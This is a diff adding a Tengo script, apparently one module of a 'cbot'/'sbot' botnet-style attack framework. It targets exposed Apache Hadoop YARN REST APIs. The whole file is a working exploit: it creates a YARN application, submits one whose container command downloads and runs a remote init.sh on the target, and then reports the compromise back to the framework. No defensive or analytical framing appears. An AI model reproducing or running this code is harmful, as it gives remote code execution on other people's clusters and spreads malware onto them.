@@ -1,0 +1,135 @@
+/*
+* This hadoop_restfull.tengo is an attack script that attacks target host by apache hadoop restfull api bugs
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+json := import("json")
+text := import("text")
+attack := import("attack")
+
+ApacheHadoopRestfullAttackName := "ApacheHadoopRestfullAttack"
+ApacheHadoopRestfullAttackType := "ApacheHadoopRestfullAttack"
+AttackInitScriptName := "init.sh"
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := proto == "https" ||port==443
+
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+//create a hadoop yarn application by yarn restfull api
+createHadoopYarnApp := func() {
+
+    url := "/ws/v1/cluster/apps/new-application"
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Accept","application/json, text/plain, */*")
+
+    response := client.send(request)
+
+     if response.getStatusCode() !=200 {
+           return {}
+       }
+
+       content := response.getBodyAsString()
+
+       if content == "" {
+           return {}
+       }
+
+       if !text.contains(content,"application-id") ||!text.contains(content,"{") {
+
+           return {}
+       }
+
+       jsonData := json.decode(content)
+
+       if is_error(jsonData)||len(jsonData["application-id"])==0 {
+           return {}
+       }
+
+       return jsonData
+}
+
+
+appJsonData := func(appId) {
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheHadoopRestfullAttackType)
+
+    jdata := {
+        "application-id":appId,
+        "application-name":"cbot_hadoop_restfull_attack",
+        "application-type":"cbot_hadoop_restfull_attack",
+        "unmanaged-AM":false,
+        "max-app-attempts":2,
+        "queue":"default",
+        "am-container-spec":{"commands":{"command":initDownloadCmd}},
+        "resource":{"memory":1024,"vCores":1}
+    }
+
+    return json.encode(jdata)
+}
+
+//make an attack payload by submitting a yarn application
+attackSubmitYarnApplication := func(appId) {
+
+    url := "/ws/v1/cluster/apps"
+    postData := appJsonData(appId)
+
+    request := http.newHttpRequest("post",url)
+    request.addHeader("User-Agent",UA)
+    request.addHeader("Accept","application/json")
+    request.addHeader("Content-Type"," application/json")
+
+    request.putString(postData,false)
+
+    client.send(request)
+}
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(result) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("ApacheHadoop")
+    attackProcess.setName(ApacheHadoopRestfullAttackName)
+    attackProcess.setType(ApacheHadoopRestfullAttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload("wget init scripts")
+    attackProcess.setResult(result)
+    //attackProcess.setDetails("")
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+main := func() {
+
+    app := createHadoopYarnApp()
+    if len(app)>0 {
+        fmt.printf("create a hadoop yarn application ok ,appId:%s,target:%s:%d",app["application-id"],host,port)
+        attackSubmitYarnApplication(app["application-id"])
+        sendAttackResult(app["application-id"])
+    }
+}
+
+main()
+
+
+
+
+
+
